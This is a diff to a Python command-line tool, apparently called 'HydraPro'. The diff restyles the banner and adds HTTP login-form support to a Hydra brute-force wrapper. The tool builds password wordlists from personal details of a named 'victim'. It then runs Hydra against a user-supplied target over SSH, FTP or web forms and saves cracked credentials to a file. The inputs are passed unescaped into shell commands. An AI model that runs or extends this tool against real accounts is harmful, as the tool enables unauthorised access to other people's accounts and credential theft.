@@ -20,20 +20,16 @@ UNDERLINE = '\033[4m'
 
 # ASCII art banners
 logo_banner = RED + '''
-⠄⠄⣴⣶⣤⡤⠦⣤⣀⣤⠆⠄⠄⠄⠄⠄⣈⣭⣭⣿⣶⣿⣦⣼⣆⠄⠄⠄⠄⠄⠄⠄⠄
-⠄⠄⠄⠉⠻⢿⣿⠿⣿⣿⣶⣦⠤⠄⡠⢾⣿⣿⡿⠋⠉⠉⠻⣿⣿⡛⣦⠄⠄⠄⠄⠄⠄
-⠄⠄⠄⠄⠄⠈⠄⠄⠄⠈⢿⣿⣟⠦⠄⣾⣿⣿⣷⠄⠄⠄⠄⠻⠿⢿⣿⣧⣄⠄⠄⠄⠄
-⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣸⣿⣿⢧⠄⢻⠻⣿⣿⣷⣄⣀⠄⠢⣀⡀⠈⠙⠿⠄⠄⠄⠄
-⠄⠄⢀⠄⠄⠄⠄⠄⠄⢠⣿⣿⣿⠈⠄⠄⠡⠌⣻⣿⣿⣿⣿⣿⣿⣿⣛⣳⣤⣀⣀⠄⠄
-⠄⠄⢠⣧⣶⣥⡤⢄⠄⣸⣿⣿⠘⠄⠄⢀⣴⣿⣿⡿⠛⣿⣿⣧⠈⢿⠿⠟⠛⠻⠿⠄⠄
-⠄⣰⣿⣿⠛⠻⣿⣿⡦⢹⣿⣷⠄⠄⠄⢊⣿⣿⡏⠄⠄⢸⣿⣿⡇⠄⢀⣠⣄⣾⠄⠄⠄
-⣠⣿⠿⠛⠄⢀⣿⣿⣷⠘⢿⣿⣦⡀⠄⢸⢿⣿⣿⣄⠄⣸⣿⣿⡇⣪⣿⡿⠿⣿⣷⡄⠄
-⠙⠃⠄⠄⠄⣼⣿⡟⠌⠄⠈⠻⣿⣿⣦⣌⡇⠻⣿⣿⣷⣿⣿⣿⠐⣿⣿⡇⠄⠛⠻⢷⣄
-⠄⠄⠄⠄⠄⢻⣿⣿⣄⠄⠄⠄⠈⠻⣿⣿⣿⣷⣿⣿⣿⣿⣿⡟⠄⠫⢿⣿⡆⠄⠄⠄⠁
-⠄⠄⠄⠄⠄⠄⠻⣿⣿⣿⣿⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⡟⢀⣀⣤⣾⡿⠃⠄⠄⠄⠄
-⠄⠄⠄⠄⢰⣶⠄⠄⣶⠄⢶⣆⢀⣶⠂⣶⡶⠶⣦⡄⢰⣶⠶⢶⣦⠄⠄⣴⣶⠄⠄⠄⠄
-⠄⠄⠄⠄⢸⣿⠶⠶⣿⠄⠈⢻⣿⠁⠄⣿⡇⠄⢸⣿⢸⣿⢶⣾⠏⠄⣸⣟⣹⣧⠄⠄⠄
-⠄⠄⠄⠄⠸⠿⠄⠄⠿⠄⠄⠸⠿⠄⠄⠿⠷⠶⠿⠃⠸⠿⠄⠙⠷⠤⠿⠉⠉⠿⠆⠄⠄⠀
+ ██░ ██ ▓██   ██▓▓█████▄  ██▀███   ▄▄▄       ██▓███   ██▀███   ▒█████  
+▓██░ ██▒ ▒██  ██▒▒██▀ ██▌▓██ ▒ ██▒▒████▄    ▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒
+▒██▀▀██░  ▒██ ██░░██   █▌▓██ ░▄█ ▒▒██  ▀█▄  ▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒
+░▓█ ░██   ░ ▐██▓░░▓█▄   ▌▒██▀▀█▄  ░██▄▄▄▄██ ▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░
+░▓█▒░██▓  ░ ██▒▓░░▒████▓ ░██▓ ▒██▒ ▓█   ▓██▒▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░
+ ▒ ░░▒░▒   ██▒▒▒  ▒▒▓  ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ 
+ ▒ ░▒░ ░ ▓██ ░▒░  ░ ▒  ▒   ░▒ ░ ▒░  ▒   ▒▒ ░░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░ 
+ ░  ░░ ░ ▒ ▒ ░░   ░ ░  ░   ░░   ░   ░   ▒   ░░         ░░   ░ ░ ░ ░ ▒  
+ ░  ░  ░ ░ ░        ░       ░           ░  ░            ░         ░ ░  
+         ░ ░      ░                                                    
 <======code by cyber-demon ======> ''' + ENDC
 
 loading_animation = [
@@ -44,7 +40,6 @@ loading_animation = [
     RED + 'Loading   [● ● ● ● ●  ]',
     RED + 'Loading   [● ● ● ● ● ●]'
 ]
-
 def generate_wordlist():
     print("Please provide information about the victim:")
     first_name = input("Enter the victim's first name: ")
@@ -85,7 +80,8 @@ def generate_wordlist():
             wordlist.extend([word_var + ''.join(random.choices(string.digits, k=random.randint(1, 5))) for word_var in word_variations])
 
     return wordlist
-
+    
+     
 def generate_and_save_wordlist(filename, wordlist):
     with open(filename, 'w') as file:
         file.write('\n'.join(wordlist))
@@ -94,23 +90,41 @@ def clear_terminal():
     os.system('cls' if os.name == 'nt' else 'clear')
 
 def perform_hydra_attack_own_wordlist(target, protocol):
-    print("Choose an option:")
+    print(RED + "Choose an option:" + OKBLUE)
     print("1. Single username Attack")
     print("2. Multiple usernames Attack")
     user_choice = input("Enter your choice (1/2): ")
+
+    if protocol == "http-post-form":
+        user_name = input("Enter the username to target: ")
+        path = input("Enter the path : ")
+        login_fail_string = input("Enter the failure string (usually an error message): ")
+        username_field = input("Enter the username field name in the form: ")
+        password_field = input("Enter the password field name in the form: ")
+        submit_button = input("Enter the name of the submit button in the login form: ")
+        pass_list = input("Enter the path to your password list: ")
+    
+        hydra_command = (
+    f"hydra -l {user_name} -P {pass_list} {target} http-post-form "
+    f"'/{path}:{username_field}=^USER^&{password_field}=^PASS^&{submit_button}=login:{login_fail_string}'")
+    
+        # Execute the Hydra command
+        clear_terminal()
+        try:
+            subprocess.run(hydra_command, shell=True, check=True)
+            print(RED + "Brute-force attack completed. Check found_credentials.txt for results." + ENDC)
+            print("Thank you for using.")
+            sys.exit(0)
+        except subprocess.CalledProcessError as e:
+            print(f"Error running Hydra: {e}")
 
     if user_choice == '1':
         single_username = input("Enter the single username: ")
         passlist_path = input("Enter the path to the password list: ")
         hydra_command = f"hydra -l {single_username} -P {passlist_path} {target} {protocol} -V -o found_credentials.txt -u"
-    elif user_choice == '2':
-        usernames_path = input("Enter the path to the file containing multiple usernames: ")
-        passlist_path = input("Enter the path to the password list: ")
-        hydra_command = f"hydra -L {usernames_path} -P {passlist_path} {target} {protocol} -V -o found_credentials.txt -u"
     else:
         clear_terminal()
         print("Invalid choice.")
-        
 
     clear_terminal()
     print(RED + "Starting Advanced Hydra Brute-force Attack..." + ENDC)
@@ -127,13 +141,13 @@ def perform_hydra_attack_own_wordlist(target, protocol):
         sys.exit(0)
     except subprocess.CalledProcessError as e:
         print(f"Error running Hydra: {e}")
-         
+
 # Clear the terminal when the tool starts
 clear_terminal()
 
 while True:
     print(logo_banner)
-    print(WARNING + "Choose an option:" + WARNING)
+    print(RED + "Choose an option:" + RED)
     print("1. Generate wordlist only")
     print("2. Perform Hydra attack")
     print("3. Exit")
@@ -149,10 +163,7 @@ while True:
         target = input("Enter the target (e.g., IP address, URL): ")
         protocol = input("Enter the protocol (e.g., ftp, ssh, http-post-form): ")
         perform_hydra_attack_own_wordlist(target, protocol)
-    elif option == '0':
-        # Code for option 3 remains the same as before
-        pass
-    elif option >= '3':
+    elif option == '3':
         break
     else:
         print("Invalid option selected.")
